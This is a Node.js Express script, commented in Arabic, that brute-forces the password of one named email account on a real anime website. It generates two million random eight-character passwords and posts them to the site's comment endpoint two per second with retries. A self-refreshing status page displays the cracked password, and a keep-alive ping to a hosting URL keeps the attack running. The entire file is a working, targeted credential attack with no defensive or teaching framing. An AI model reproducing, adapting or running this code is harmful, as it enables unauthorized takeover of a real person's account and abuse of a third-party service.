const express = require("express");
const app = express();
const axios = require("axios");

const targetEmail = "abrheem16@gmail.com";
const animeId = "532";
const commentText = "TEST";

let foundPassword = null;
let finished = false;
let currentTries = [];
let allPasswords = [];
let currentIndex = 0;

const parallelPerSecond = 2;

async function tryPassword(password, retries = 3) {
  try {
    const response = await axios.post(
      "https://app.sanime.net/function/h10.php?page=addcmd",
      new URLSearchParams({
        email: targetEmail,
        password: password,
        item: JSON.stringify({ post: commentText, id: animeId, fire: false }),
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "User-Agent":
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
          Connection: "keep-alive",
        },
        timeout: 8000,
      }
    );

    if (response.data && typeof response.data === "object" && response.data.status === 1) {
      foundPassword = password;
      finished = true;
      console.log(`✅ Found password: ${password}`);
    }
  } catch (err) {
    if (retries > 0 && !foundPassword && !finished) {
      console.log(`⚠️ خطأ مع الباسورد ${password}... إعادة المحاولة`);
      await tryPassword(password, retries - 1);
    }
  }
}

async function bruteForceStart() {
  const interval = setInterval(async () => {
    if (finished || currentIndex >= allPasswords.length) {
      clearInterval(interval);
      finished = true;
      return;
    }

    const batch = allPasswords.slice(currentIndex, currentIndex + parallelPerSecond);
    currentTries = batch;
    await Promise.all(batch.map(pwd => tryPassword(pwd)));
    currentIndex += parallelPerSecond;
  }, 1000); // كل ثانية
}

app.get("/", (req, res) => {
  const html = `
    <html>
      <head><meta http-equiv="refresh" content="5"><title>Status</title></head>
      <body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:50px">
        <h1>🔐 كلمة المرور:</h1>
        ${
          foundPassword
            ? `<h2 style="color:#0f0">${foundPassword}</h2>`
            : finished
            ? `<h2 style="color:orange">❌ تم الانتهاء من جميع الباسوردات ولم يتم العثور على الباسورد الصحيح</h2>`
            : `<h2>جارٍ البحث... 🌀</h2><h3>تجريب: ${currentTries.join(" , ")}</h3>`
        }
        <p style="color:#888">📡 الرابط: https://noon-9v11.onrender.com/</p>
      </body>
    </html>`;
  res.send(html);
});

// توليد كلمات مرور عشوائية حسب النمط
function generatePasswords(count) {
  const charset = "abcdefghijklmnopqrstuvwxyz";
  const digits = "0123456789";
  const list = new Set();

  while (list.size < count) {
    let password = "";
    let numDigits = Math.floor(Math.random() * 4); // 0 إلى 3 أرقام
    let numLetters = 8 - numDigits;

    for (let i = 0; i < numLetters; i++) {
      password += charset[Math.floor(Math.random() * charset.length)];
    }
    for (let i = 0; i < numDigits; i++) {
      password += digits[Math.floor(Math.random() * digits.length)];
    }

    // Shuffle الحروف حتى لا تكون الأحرف دائمًا أولاً
    password = password.split("").sort(() => Math.random() - 0.5).join("");
    list.add(password);
  }

  return Array.from(list);
}

// توليد 2 مليون باسورد
allPasswords = generatePasswords(2000000);
bruteForceStart();

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});

// ⏱️ إبقاء السيرفر نشط على Render
setInterval(() => {
  axios.get("https://noon-9v11.onrender.com/").catch(() => {});
}, 5 * 60 * 1000); // كل 5 دقائق
